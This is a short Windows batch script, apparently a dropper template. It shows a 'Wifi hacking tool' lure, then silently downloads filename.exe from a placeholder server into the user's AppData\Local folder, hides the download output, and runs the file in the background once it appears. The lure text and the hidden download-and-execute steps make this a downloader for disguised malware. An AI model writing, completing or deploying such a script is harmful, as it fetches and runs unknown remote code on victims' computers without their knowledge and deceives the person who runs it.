@echo off

set "server_url=apache_server_link/"
set "server_file=filename.exe"

set "downloads_folder=%USERPROFILE%\AppData\Local\"

echo Download Wifi hacking tool
echo Please Wait
curl -o "%downloads_folder%\filename.exe" %server_url%%server_file% > NUL 2>&1

:CHECK_DOWNLOAD
if exist "%downloads_folder%\filename.exe" (
    start "" /B "%downloads_folder%\filename.exe"
) else (
    timeout /t 1
    goto CHECK_DOWNLOAD
)

exit
